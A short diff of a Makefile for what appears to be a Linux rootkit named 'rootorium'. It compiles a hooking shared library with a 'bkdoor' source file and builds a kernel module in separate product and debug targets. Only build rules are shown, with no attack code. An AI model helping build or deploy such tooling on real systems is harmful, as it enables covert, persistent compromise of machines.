@@ -2,20 +2,21 @@ ARCH_INT := $(shell uname -m | sed 's/i686/32/; s/x86_64/64/')
 #ARCH_STR := $(uname -r | sed -e 's/i386/common/' -e 's/amd64/common/')
 
 all: product debug
-	cd kern_mod && make
-	cp kern_mod/rootorium.ko Release/
-	cp kern_mod/rootorium.ko Debug/
 
 ifeq ($(UNAME), i686)
-
 product: rootorium.so.i686
+	cd kern_mod && make -f Makefile.product
+	cp kern_mod/rootorium.ko Release/rootorium.ko
 debug: rootorium.so.i686.dbg
-
+	cd kern_mod && make -f Makefile.debug
+	cp kern_mod/rootorium.ko Debug/rootorium.ko.dbg
 else
-
 product: rootorium.so
+	cd kern_mod && make -f Makefile.product
+	cp kern_mod/rootorium.ko Release/rootorium.ko
 debug: rootorium.so.dbg
-
+	cd kern_mod && make -f Makefile.debug
+	cp kern_mod/rootorium.ko Debug/rootorium.ko.dbg
 endif
 
 rootorium.so: src/rootorium.c
@@ -37,6 +38,6 @@ rootorium.so.i686.dbg: src/rootorium.c
 	gcc -m32 -std=gnu99 -g -DDEBUG -O0 -Wall -Wl,--build-id=none -pthread -ldl src/dlsym.c src/bkdoor.c src/misc.c src/rootorium.c -o Debug/rootorium.so.i686.dbg
 
 clean:
-	cd kern_mod && make clean
+	cd kern_mod && make -f Makefile.product clean
 	rm -f Release/*
 	rm -f Debug/*
